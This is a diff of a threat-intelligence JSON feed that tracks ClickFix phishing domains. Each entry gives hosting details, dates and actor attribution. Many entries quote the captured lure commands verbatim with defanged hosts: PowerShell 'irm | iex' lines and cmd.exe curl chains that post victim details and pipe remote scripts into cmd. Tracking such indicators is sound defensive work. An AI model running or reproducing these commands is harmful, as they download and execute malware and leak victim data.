+    "cmd.exe /c \"curl.exe -sL -d \"\"id=fefabc6d-5472-4e7e-9ce3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.ingecolsan.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A34%3A21.908Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A34%3A21.908Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -103560,7 +103504,7 @@
      "asn": "AS200719",
      "org": "Miss Hosting AB",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -103568,7 +103512,7 @@
      "host": "keno.live",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -103683,6 +103627,56 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "keymessage.so",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-01",
+   "last_seen": "2026-11-01",
+   "last_online": "2026-11-01",
+   "offline_since": null,
+   "url": "https://keymessage.so/",
+   "brand": "Meta",
+   "product": "Instagram",
+   "hosting": "Oracle Cloud",
+   "dns": "keymessage.so",
+   "ip": "162.240.237.17",
+   "asn": "AS31898",
+   "org": "Oracle Corporation",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "162.240.237.17",
+     "asn": "AS31898",
+     "org": "Oracle Corporation",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "keymessage.so",
+     "status": "online",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=5f658b11-99d5-405a-a577-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fkeymessage.so%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T00%3A06%3A18.519Z\"\" -d \"\"lastShellAt=2026-11-01T00%3A06%3A18.519Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+   ],
+   "connects_to": [
+    "fingerprint-veri.info"
+   ],
+   "lure_from": [
+    "ncheck-brows.beer"
+   ]
   },
   {
    "indicator": "keyprolocksmiths.co.uk",
@@ -113872,64 +113866,6 @@
     "interseq.at",
     "id-verfied.boats",
     "ncheck-brows.beer"
-   ]
-  },
-  {
-   "indicator": "mahaguru.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-26",
-   "last_seen": "2026-10-31",
-   "last_online": "2026-10-31",
-   "offline_since": null,
-   "url": "https://www.mahaguru.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "282",
-   "dns": "Cloudflare",
-   "ip": "216.48.183.67",
-   "asn": "AS132420",
-   "org": "E2E-NETWORKS-IN - 282, Sector 19, IN",
-   "country": "IN",
-   "ips": [
-    {
-     "ip": "216.48.183.67",
-     "asn": "AS132420",
-     "org": "E2E-NETWORKS-IN - 282, Sector 19, IN",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-10-31"
-    },
-    {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.mahaguru.com",
-     "status": "online",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'ncheck-brows[.]beer/[id]'|iex;",
-    "irm 'id-verfied.boats/[id]'|iex;"
-   ],
-   "connects_to": [
-    "ncheck-brows.beer",
-    "id-verfied.boats"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com"
    ]
   },
   {
@@ -131133,7 +131069,7 @@
      "asn": "AS22612",
      "org": "Namecheap, Inc.",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -131141,7 +131077,7 @@
      "host": "noobwin.org",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -135751,9 +135687,9 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=feaf|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=feaf|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=859b|iex"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=f9f6|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=f9f6|iex</span>",
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=feaf|iex"
    ],
    "connects_to": [
     "ubbrobccheck20.cc"
@@ -141654,9 +141590,10 @@
     "mon-blanc-02.cfd",
     "thu-ipad-03.cfd",
     "interseq.at",
-    "ciganshina.org",
     "abcsgftr.cc",
-    "pakistanskimalchik.org"
+    "ciganshina.org",
+    "pakistanskimalchik.org",
+    "efreitorher.org"
    ]
   },
   {
@@ -149867,8 +149804,8 @@
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -168720,15 +168657,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=61792080-0f28-4412-8ac0-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fstylinbyshikha.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A46.669Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A46.669Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=473df3f6-6b0a-41ea-92a7-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fstylinbyshikha.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T18%3A32%3A43.944Z\"\" -d \"\"lastShellAt=2026-10-29T18%3A32%3A43.944Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=47e31392-629c-470b-ad51-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fstylinbyshikha.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T23%3A21%3A59.341Z\"\" -d \"\"lastShellAt=2026-10-31T23%3A21%3A59.341Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=61792080-0f28-4412-8ac0-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fstylinbyshikha.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A46.669Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A46.669Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -178215,15 +178152,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=f0488ed5-4544-4c26-b1d3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ftiacollege.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A44.071Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A44.071Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=28470e72-d55e-497a-891e-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ftiacollege.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T18%3A32%3A41.464Z\"\" -d \"\"lastShellAt=2026-10-29T18%3A32%3A41.464Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=a252c540-4531-4899-b0bd-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ftiacollege.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T23%3A22%3A01.603Z\"\" -d \"\"lastShellAt=2026-10-31T23%3A22%3A01.603Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=f0488ed5-4544-4c26-b1d3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ftiacollege.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A44%3A44.071Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A44%3A44.071Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -187161,7 +187098,7 @@
      "asn": "AS132241",
      "org": "SKSA TECHNOLOGY SDN BHD",
      "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -187169,7 +187106,7 @@
      "host": "vassolutionasia.com",
      "status": "online",
      "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -187208,7 +187145,7 @@
      "asn": "AS48660",
      "org": "VERIUP Bulut Internet Hizmetleri A.S.",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
@@ -187216,7 +187153,7 @@
      "host": "vayotek.com",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": null,
@@ -189903,8 +189840,8 @@
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -193846,44 +193783,44 @@
    "type": "domain",
    "category": "clickfix",
    "campaign": null,
-   "role": "Redirector",
+   "role": "Phishing page",
    "status": "online",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-10-31",
+   "first_seen": "2026-10-28",
+   "last_seen": "2026-11-01",
    "last_online": "2026-10-31",
    "offline_since": null,
    "url": "https://wkaikido.pl/",
    "brand": null,
    "product": null,
-   "hosting": "GDA Cyber_Folks S.A.",
+   "hosting": "Cyber_Folks S.A.",
    "dns": "cyberfolks.pl",
    "ip": "91.237.52.26",
    "asn": "AS41079",
-   "org": "CF-GDA Cyber_Folks S.A., PL",
+   "org": "Cyber_Folks S.A.",
    "country": "PL",
    "ips": [
     {
      "ip": "91.237.52.26",
      "asn": "AS41079",
      "org": "Cyber_Folks S.A.",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-31"
+     "first_seen": "2026-10-28",
+     "last_seen": "2026-11-01"
     }
    ],
    "hosts": [
     {
      "host": "wkaikido.pl",
      "status": "online",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-31"
+     "first_seen": "2026-10-28",
+     "last_seen": "2026-11-01"
     }
    ],
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=760058d6-5937-4acc-8cb6-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwkaikido.pl%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T13%3A55%3A32.094Z\"\" -d \"\"lastShellAt=2026-10-31T13%3A55%3A32.094Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=79bdc2d4-333a-488c-9524-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwkaikido.pl%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T10%3A39%3A00.364Z\"\" -d \"\"lastShellAt=2026-10-30T10%3A39%3A00.364Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=b8e001cd-6702-4e91-a275-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwkaikido.pl%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T22%3A57%3A56.186Z\"\" -d \"\"lastShellAt=2026-10-31T22%3A57%3A56.186Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=0cdd68eb-1fd6-4de0-bfa8-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwkaikido.pl%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-30T19%3A04%3A13.670Z\"\" -d \"\"lastShellAt=2026-10-30T19%3A04%3A13.670Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -193892,11 +193829,11 @@
     "analyticroutebox.com",
     "eventwireix.com",
     "metricserveonline.com",
+    "ncheck-brows.beer",
+    "codes.caffe-img.com",
     "jscdncloude.beer",
     "id-verfied.boats",
-    "cloud-browse.codes",
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "cloud-browse.codes"
    ]
   },
   {
@@ -196947,12 +196884,12 @@
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "btorsercoyt31.cc",
-    "zurggoyttjof21.cc",
     "verifyidentrob01.cc",
     "ubbrobccheck20.cc",
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "btorsercoyt31.cc",
+    "zurggoyttjof21.cc",
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
